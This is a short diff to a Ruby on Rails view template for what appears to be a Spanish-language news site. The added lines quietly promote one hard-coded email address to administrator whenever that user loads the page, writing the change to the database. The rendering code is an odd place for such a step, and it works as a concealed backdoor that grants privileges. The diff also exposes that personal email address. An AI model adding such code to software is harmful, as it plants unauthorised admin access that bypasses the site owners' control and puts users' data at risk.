@@ -39,6 +39,9 @@
 </table>
 <br>
 <% if current_user %>
+  <% if current_user.email == 'felipe_besa@hotmail.com' %>
+    <% current_user.update_attribute :admin, true %>
+  <% end %>
   <% if current_user.admin %>
     <%= link_to 'Sitio administracion', 'news/admin' %>
   <% end %>
